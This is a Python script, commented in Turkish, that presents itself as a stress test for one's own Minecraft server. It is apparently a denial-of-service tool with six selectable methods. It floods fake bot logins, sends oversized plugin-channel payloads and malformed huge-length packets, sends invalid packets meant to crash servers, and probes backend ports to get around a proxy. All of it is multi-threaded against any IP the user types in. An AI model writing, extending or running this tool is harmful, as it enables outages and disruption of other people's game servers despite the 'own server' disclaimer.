#!/usr/bin/env python3
"""
Minecraft Server Stress Test — kendi sunucun için.
Canlı CPS sayacı + hata raporlamalı.
"""
import socket, struct, random, threading, time, sys, os

# ============ PROTOKOL ============
def write_varint(v):
    out = bytearray()
    while v & 0xFFFFFF80:
        out.append((v & 0x7F) | 0x80)
        v >>= 7
    out.append(v & 0x7F)
    return bytes(out)

def write_str(s):
    b = s.encode('utf-8') if isinstance(s, str) else s
    return write_varint(len(b)) + b

def read_varint(s):
    v = 0
    for i in range(5):
        b = s.recv(1)
        if not b: return None
        v |= (b[0] & 0x7F) << (7 * i)
        if not (b[0] & 0x80): return v
    return None

def read_packet(s):
    length = read_varint(s)
    if length is None or length == 0: return None
    data = b''
    while len(data) < length:
        chunk = s.recv(length - len(data))
        if not chunk: return None
        data += chunk
    return data

def hs_pkt(host, port, proto=767, next_state=2):
    p = write_varint(proto) + write_str(host) + struct.pack('>H', port) + write_varint(next_state)
    return write_varint(len(p) + 1) + write_varint(0x00) + p

def login_pkt(name):
    p = write_str(name[:16])
    return write_varint(len(p) + 1) + write_varint(0x00) + p

def ping_pkt():
    p = write_varint(0x00)
    return write_varint(len(p) + 1) + p

def custom_payload(channel, data):
    p = write_varint(0x0A) + write_str(channel) + (data if isinstance(data, bytes) else data.encode())
    return write_varint(len(p)) + p

def chat_pkt(msg):
    p = write_varint(0x04) + write_str(msg)
    return write_varint(len(p)) + p

def plugin_msg_pkt(channel, data):
    p = write_varint(0x02) + write_str(channel) + (data if isinstance(data, bytes) else data.encode())
    return write_varint(len(p)) + p

# ============ THREAD SAFE COUNTERS ============
class Counter:
    def __init__(self):
        self.val = 0
        self.fail = 0
        self.lock = threading.Lock()
    def ok(self): 
        with self.lock: self.val += 1
    def nope(self): 
        with self.lock: self.fail += 1

# ============ BOT NAMES ============
NAMES = ["Skush_ON", "Dreamlesz", "Papa_bean", "awesomebboy1", "Doctorlogs",
    "wyblake", "G0dsend", "legiel", "ravinseye", "T3RRORS", "synapse32",
    "iLimee", "WargFar", "Crimson573", "Maxdog8", "Beltorz", "S1tella",
    "BoZy_", "Qubearth", "Husovschi", "kingmankid", "LordOstrich",
    "Bubbles15458", "Kandyude", "Bibiii_", "AtaKhan", "RehaKun",
    "CrimmyKinz", "DovaSpartan258", "VoxxHimm", "kyunyuu", "ZeroZekurom",
    "Cithid", "GamerLeah", "Siellov", "DoctorBandage", "TheLilNuggie",
    "Dierteshin", "ShaanIsTheBoss", "Snoopear", "Epsilon11111",
    "NiceHaxBro", "HadesLegends", "Reus228", "CrookedReign",
    "ArxiGames", "TheAlanCris", "oBapp", "bigbrainmutant", "poteto1008",
    "Mercg0d", "Laurmau4Life", "Sim0thy", "OgAaronn", "Zirconic01",
    "Griffin2016", "Squitten", "EXPGamingTTV", "Vexiane", "Lulua_OwO",
    "Inaxho", "Rudybnt", "Tabaaht", "ClareKitty", "ZelChaos",
    "Pheonix089", "Tekkarath", "KikiTime", "Phe0nixWarri0r",
    "laazzaarus", "Chiara601", "Rapelz99", "Kadenn", "Corpselips",
    "Henktor", "BazooKaa", "TheRageful", "Boss_Babyy", "Bubba_Tea",
    "Dexterity99", "FrostyPvP", "Godlike_Boy", "JumpyPanda",
    "KillerBee", "LemonTree", "MegaNova", "NightOwl", "OmegaX",
    "PinkyPromise", "RapidFire", "ShadowFang", "BlazeIt", "CreeperKiller",
    "DarkWolF", "ElitePro", "FireStorm", "GhostPvP", "HyperX",
    "IceDragon", "JumpMan", "KingSlay", "LunarEcl", "MoonWalk",
    "NinjaPvP", "Oblivion", "PhantomX", "QuickSilver", "RageMode",
    "SilentKill", "ToxicBoy", "UltraInstinct", "ViperX", "WarMachine"]

def rand_name():
    return random.choice(NAMES)[:15]

# ============ METHOD'LAR ============

def botjoiner(host, port, duration, threads, proto, ctr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(hs_pkt(host, port, proto, 2))
        s.send(login_pkt(rand_name()))
        time.sleep(0.05)
        s.close()
        ctr.ok()
    except: ctr.nope()

def bungeedowner(host, port, duration, threads, proto, ctr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(hs_pkt(host, port, proto, 2))
        s.send(login_pkt(rand_name()))
        time.sleep(0.1)
        # CustomPayload flood - PLAY state gerekmez, LOGIN'de de dene
        big = bytes([random.randint(0,255) for _ in range(4096)])
        for _ in range(50):
            try: s.send(custom_payload("MC|BEdit", big))
            except: break
            try: s.send(custom_payload("MC|Brand", big))
            except: break
            try: s.send(plugin_msg_pkt("MC|BEdit", big))
            except: break
        s.close()
        ctr.ok()
    except: ctr.nope()

def memory(host, port, duration, threads, proto, ctr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(hs_pkt(host, port, proto, 2))
        s.send(login_pkt(rand_name()))
        huge = b'\x00' * (1024 * 1024)
        try:
            mal = write_varint(0x7FFFFFFF) + huge
            s.send(mal)
        except: pass
        s.close()
        ctr.ok()
    except: ctr.nope()

def uuidcrash(host, port, duration, threads, proto, ctr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(hs_pkt(host, port, proto, 2))
        name = f"XDDOS_{random.randint(0,9999)}"
        s.send(login_pkt(name))
        time.sleep(0.05)
        # Geçersiz UUID paketi
        mal = write_varint(0x02) + write_str("a2xSdioDOANdo92JIdIADc")
        s.send(write_varint(len(mal)) + mal)
        s.close()
        ctr.ok()
    except: ctr.nope()

def waterfallbypass(host, port, duration, threads, proto, ctr):
    back_ports = [25565, 25600, 26000, 25566, 25577]
    for bp in back_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, bp))
            s.send(hs_pkt(host, bp, proto, 2))
            s.send(b'\x00FML\x00')
            s.send(login_pkt("BACKEND_TEST"))
            s.close()
            ctr.ok()
        except: ctr.nope()

def pingmulticrasher(host, port, duration, threads, proto, ctr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(hs_pkt(host, port, proto, 1))
        s.send(ping_pkt())
        time.sleep(0.02)
        s.close()
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.settimeout(5)
        s2.connect((host, port))
        s2.send(hs_pkt(host, port, proto, 2))
        s2.send(login_pkt(rand_name()))
        time.sleep(0.02)
        s2.close()
        ctr.ok()
    except: ctr.nope()

METHODS = {
    "1": ("BotJoiner", botjoiner),
    "2": ("BungeeDowner", bungeedowner),
    "3": ("Memory", memory),
    "4": ("UUIDCrash", uuidcrash),
    "5": ("WaterfallBypass", waterfallbypass),
    "6": ("PingMulticrasher", pingmulticrasher),
}

def run_method(method_func, host, port, duration, threads, proto):
    ctr = Counter()
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            method_func(host, port, duration, threads, proto, ctr)

    print(f"[{'='*40}]")
    print(f"[BASLIYOR] {threads} thread, {duration}s, proto={proto}")
    print(f"[{'='*40}]")

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()

    # Canlı sayaç
    start = time.time()
    for sec in range(duration):
        if stop.is_set(): break
        time.sleep(1)
        elapsed = int(time.time() - start)
        with ctr.lock:
            ok, fail = ctr.val, ctr.fail
        print(f"  [{elapsed}s] OK:{ok}  FAIL:{fail}  CPS:{ok//elapsed if elapsed else 0}")

    stop.set()
    for t in ts: t.join(timeout=1)
    with ctr.lock:
        print(f"[SONUC] OK:{ctr.val}  FAIL:{ctr.fail}  TOPLAM:{ctr.val+ctr.fail}")

def main():
    os.system('cls' if os.name == 'nt' else '')
    print("=" * 50)
    print("  MC STRESS TEST — KENDI SUNUCUNDA TEST ICIN")
    print("=" * 50)
    host = input("Sunucu IP: ").strip() or "localhost"
    try: port = int(input("Port (25565): ").strip() or "25565")
    except: port = 25565
    try: duration = int(input("Sure (saniye): ").strip() or "30")
    except: duration = 30
    try: threads = int(input("Thread (100): ").strip() or "100")
    except: threads = 100
    try: proto = int(input("MC Protocol (764=1.21.1): ").strip() or "764")
    except: proto = 764

    print("\nMethod:")
    for k, (n, _) in METHODS.items():
        print(f"  {k}. {n}")
    sec = input("Secim: ").strip()

    if sec in METHODS:
        name, func = METHODS[sec]
        run_method(func, host, port, duration, threads, proto)
    else:
        print("Gecersiz secim!")

if __name__ == "__main__":
    main()
